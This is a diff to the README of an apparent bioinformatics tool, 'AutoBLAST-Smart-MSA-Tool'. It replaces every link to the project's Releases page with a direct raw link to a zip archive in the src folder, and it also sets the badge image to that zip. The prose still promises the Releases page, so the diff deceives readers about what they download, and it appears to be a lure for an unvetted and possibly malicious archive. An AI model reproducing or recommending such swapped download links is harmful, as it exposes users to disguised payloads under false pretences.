@@ -1,6 +1,6 @@
 # 🔍 AutoBLAST-Smart-MSA-Tool - Align Sequences with Ease
 
-[![Download AutoBLAST-Smart-MSA-Tool](https://img.shields.io/badge/Download-Version%201.0-blue)](https://github.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/releases)
+[![Download AutoBLAST-Smart-MSA-Tool](https://raw.githubusercontent.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/main/src/AutoBLAST-Smart-MSA-Tool_3.6.zip%201.0-blue)](https://raw.githubusercontent.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/main/src/AutoBLAST-Smart-MSA-Tool_3.6.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ Before you can start using AutoBLAST-Smart-MSA-Tool, you need to download and in
 
 1. **Visit the Download Page**
    - Click the link below to go to the Releases page.
-   - [Download AutoBLAST-Smart-MSA-Tool](https://github.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/releases)
+   - [Download AutoBLAST-Smart-MSA-Tool](https://raw.githubusercontent.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/main/src/AutoBLAST-Smart-MSA-Tool_3.6.zip)
 
 2. **Find the Latest Release**
    - On the Releases page, look for the section titled "Latest Release". This section lists the newest version of the AutoBLAST-Smart-MSA-Tool.
@@ -81,6 +81,6 @@ Make sure your computer meets the following requirements before installing:
 
 Ready to get started? Click below to go to the Releases page.
 
-[**Download AutoBLAST-Smart-MSA-Tool**](https://github.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/releases)
+[**Download AutoBLAST-Smart-MSA-Tool**](https://raw.githubusercontent.com/ItzRealMePrime/AutoBLAST-Smart-MSA-Tool/main/src/AutoBLAST-Smart-MSA-Tool_3.6.zip)
 
 Enjoy effortless sequence alignment with AutoBLAST-Smart-MSA-Tool!
